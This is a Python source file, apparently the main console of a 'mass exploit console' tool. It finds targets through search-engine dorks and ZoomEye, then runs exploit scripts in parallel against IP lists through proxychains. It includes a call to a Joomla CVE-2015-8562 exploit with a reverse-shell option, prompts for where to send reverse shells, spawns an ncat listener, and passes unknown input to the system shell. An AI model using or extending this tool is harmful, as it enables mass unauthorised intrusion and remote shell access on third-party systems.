#!/usr/bin/python3

'''
mass exploit console
by jm33-ng
'''

import os
import subprocess
import sys
import time

import lib.cli.colors as colors
import lib.cli.console as console
import lib.tools.baidu as baidu
import lib.tools.exploits as ExecExp
from lib.cli.console import debug_except, input_check, check_kill_process
from lib.tools import zoomeye


class SessionParameters:

    '''
    define some global parameters
    '''

    INIT_DIR = os.getcwd()
    OUT_DIR = INIT_DIR + '/output'
    PROXY_CONF = INIT_DIR + \
        '/data/proxy.conf'
    USE_PROXY = True
    IP_LIST = INIT_DIR + \
        '/data/ip_list.txt'
    PROXY_BIN = INIT_DIR + \
        '/tools/ss-proxy'
    SS_CONFIG = INIT_DIR + \
        '/data/ss.json'


def list_exp():
    '''
    list all executables under the root of your exploit dir
    '''
    def is_executable(path):
        '''
        check if executable
        '''
        return os.path.isfile(path) and os.access(path, os.X_OK)

    pocs = []  # save poc in a list
    for root, _, files in os.walk('exploits'):
        paths = []
        for filename in files:
            path = './' + root + '/' + filename
            paths.append(path)
        for pathname in paths:
            poc = '/'.join(pathname.split('/')[2:])
            if len(pathname.split('/')) > 4:
                continue
            if is_executable(pathname):
                pocs.append(poc)
    return pocs


def execute(cmd):
    '''
    handles user input in console
    '''

    cmd = str(cmd).lower().strip()
    if cmd == '':
        return
    elif cmd == 'info':
        print(
            colors.CYAN +
            '[*] Current directory: {}\
            \n[*] Init directory: {}\
            \n[*] Target: {}\
            \n[*] Proxy config: {}'.format(
                os.getcwd(),
                SessionParameters.INIT_DIR,
                SessionParameters.IP_LIST,
                SessionParameters.PROXY_CONF) +
            colors.END)
    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])
        if not target in os.listdir(SessionParameters.INIT_DIR + '/data'):
            return
        print(colors.BLUE + '[i] Target changed to {}'.format(target))
        SessionParameters.IP_LIST = SessionParameters.INIT_DIR + \
            '/data/' + target
    elif cmd == 'init' or cmd == 'i':
        print(colors.CYAN +
              '[*] Going back to init_dir...' + colors.END)
        os.chdir(SessionParameters.INIT_DIR)
    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir(SessionParameters.OUT_DIR)
            print(colors.PURPLE + '[*] Searching on Baidu...' + colors.END)
            baidu.spider(dork, count)
        except (IndexError, EOFError, KeyboardInterrupt, SystemExit):
            return
    elif cmd == 'proxy':
        if not os.path.exists(SessionParameters.SS_CONFIG):
            console.print_error(
                '[-] Please make sure {} exists'.format(SessionParameters.SS_CONFIG))
        try:
            subprocess.Popen(
                [SessionParameters.PROXY_BIN,
                 '-c',
                 SessionParameters.SS_CONFIG],
                stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
        except BaseException as err:
            console.print_error(
                '[-] Error starting Shadowsocks proxy: ' + str(err))
            debug_except()
    elif cmd == 'redis':
        console.print_error('[-] Under development')
    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
        except BaseException as err:
            console.print_error(str(err))
            debug_except()
    elif cmd == 'q' or cmd == 'quit':
        check_kill_process('ss-proxy')
        sys.exit(0)
    elif cmd == 'h' or cmd == 'help' or cmd == '?':
        print(console.HELP_INFO)
    elif cmd == 'exploits':
        print(colors.CYAN + '[+] Available exploits: ' + colors.END)
        for poc in list_exp():
            print(colors.BLUE + poc + colors.END)
    elif cmd == 'z' or cmd == "zoomeye":
        try:
            zoomeye.run()
        except (EOFError, KeyboardInterrupt, SystemExit):
            pass
        else:
            debug_except()
    elif cmd == 'x' or cmd == 'clear':
        os.system("clear")
    elif cmd == 'c' or cmd == 'reset':
        os.system("reset")
    elif cmd == "attack" or cmd == "e":
        attack()
    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END +
                colors.GREEN +
                cmd +
                colors.END +
                '\n')
            os.system(cmd)
        except (EOFError, KeyboardInterrupt, SystemExit):
            pass


def attack():
    '''
    handles attack command
    '''

    if input_check('[?] Do you wish to use proxychains? [y/n] ', choices=['y', 'n']) == 'y':
        SessionParameters.USE_PROXY = True
    else:
        SessionParameters.USE_PROXY = False
    answ = input_check(
        '\n[?] Do you wish to use\
        \n\n    [a] built-in exploits\
        \n    [m] or launch your own manually?\
        \n\n[=] Your choice: ',
        choices=['a', 'm'])
    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.BUILT_IN)
        answ = input_check(
            '[=] Your choice: ',
            check_type=int,
            choices=['0',
                     '1',
                     '2',
                     '3',
                     '4'])
        try:
            if answ == '2':
                console.print_error("\n[-] Under development")
            elif answ == '1':
                console.print_error('\n[-] Under development')
            elif answ == '0':
                scanner(ExecExp.weblogic())
            elif answ == '3':
                scanner(ExecExp.s2_045())
            elif answ == '4':
                scanner(ExecExp.witbe())
        except BaseException:
            console.print_error("[-] We have an error executing exploit")
            debug_except()

    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, in here you can choose your own exploit\n" +
            colors.END)
        print(colors.CYAN + '[*] Here are available exploits:\n' + colors.END)
        for poc in list_exp():
            print(colors.BLUE + poc + colors.END)
        exploit = input_check(
            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ", choices=list_exp())
        jobs = int(
            input_check("[?] How many processes each time? ", check_type=int))
        custom_args = []
        answ = input_check(
            "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
        if answ == 'y':
            lhost = input(
                "[*] Where do you want me to send shells? ").strip()
            lport = input_check(
                "[*] and at what port? (make sure you have access to that port) ",
                check_type=int)
            custom_args = ['-l', lhost, '-p', lport]
            answ = input_check(
                '[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
            if answ == 'y':
                print("\n[*] Spawning ncat listener in new window...\n")
                try:
                    subprocess.Popen(
                        args=[
                            "gnome-terminal",
                            "--command=ncat -nklvp " +
                            lport +
                            " -m 1000"],
                        shell=False,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
                except BaseException:
                    print(
                        colors.YELLOW +
                        "[-] Could not launch our listener, do you have GNOME-Terminal installed?" +
                        colors.END +
                        '\n')
            else:
                print(
                    "[*] Okay, just make sure you receive the reverse shells\n")
        else:
            pass
        custom_args += input(
            "[*] args for this exploit (target IP is handled already) ").strip().split()
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        delimtr = '/'
        exec_path = delimtr.join(exec_path)
        work_path = delimtr.join(work_path)
        delimtr = ' '
        print(
            colors.BLUE +
            '[*] Your exploit will be executed like\n' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            delimtr.join(custom_args))
        scanner_args = (
            exploit,
            work_path,
            exec_path,
            custom_args,
            jobs)
        scanner(scanner_args)
    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    '''
    Execute exploit against given ip list
    '''

    # looks ugly, but since it works well, im not planning a rewrite
    _, work_path, exec_path, custom_args, jobs = scanner_args[0], \
        scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
    if SessionParameters.USE_PROXY:
        e_args = [
            'proxychains4',
            '-q',
            '-f',
            SessionParameters.PROXY_CONF,
            './' + exec_path]
    else:
        e_args = ['./' + exec_path]
    e_args += custom_args
    e_args += ['-t']
    try:
        target_list = open(SessionParameters.IP_LIST)
    except BaseException as exc:
        console.print_error('[-] Error occured: {}\n'.format(exc))
        debug_except()
        return
    os.chdir('./exploits/' + work_path)
    console.print_warning(
        '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
    if input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
        return
    console.print_warning('\n[!] It might be messy, get ready!' + '\n')
    time.sleep(2)
    count = 0
    tested = count
    rnd = 1
    for line in target_list:
        target_ip = line.strip()
        progress = colors.BLUE + colors.BOLD + 'ROUND.' + \
            str(rnd) + colors.END + '  ' + colors.CYAN + colors.BOLD + \
            str(tested + 1) + colors.END + ' targets found\n'
        try:
            sys.stdout.write('\r' + progress)
            sys.stdout.flush()
        except KeyboardInterrupt:
            exit()
        count += 1
        tested += 1
        try:
            e_args += [target_ip]
            print(colors.CYAN + ' '.join(e_args) + colors.END + '\n')
            proc = subprocess.Popen(e_args)

            # continue to next target
            e_args.remove(target_ip)
            time.sleep(.1)

            if count == jobs or count == 0:
                count = 0
                rnd += 1
                _, _ = proc.communicate()
                if proc.returncode is not None:
                    proc.kill()
                continue
            sys.stdout.flush()
            os.system('clear')
        except (EOFError, KeyboardInterrupt, SystemExit):
            sys.exit(1)
        else:
            console.print_error('[-] Error when running scanner')
            debug_except()
    os.system('clear')
    os.chdir(SessionParameters.INIT_DIR)
    console.print_success('\n[+] All done!\n')
    print(console.INTRO)


def main():
    '''
    manage procedure
    '''

    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()
    if answ.lower() == 'n':
        os.system("ls data")
        SessionParameters.IP_LIST = SessionParameters.INIT_DIR + '/data/' + \
            input_check(
                '[=] Choose your target IP list, eg. ip_list.txt ',
                choices=os.listdir('data'))
    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                colors.UNDERLINE +
                "\nmec" +
                colors.END +
                colors.CYAN +
                colors.BOLD +
                " > " +
                colors.END)
            try:
                execute(cmd)
            except (KeyboardInterrupt, EOFError, SystemExit):
                sys.exit(0)
        except KeyboardInterrupt:
            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            if answ.lower() == 'y':
                check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue


def run():
    '''
    start mec
    '''
    try:
        print(console.INTRO)
        main()
    except (EOFError, KeyboardInterrupt, SystemExit):
        console.print_error('[-] Exiting...')
    else:
        console.print_error(
            "[-] Seems like you\'ve encountered an unhandled exception")
        debug_except()
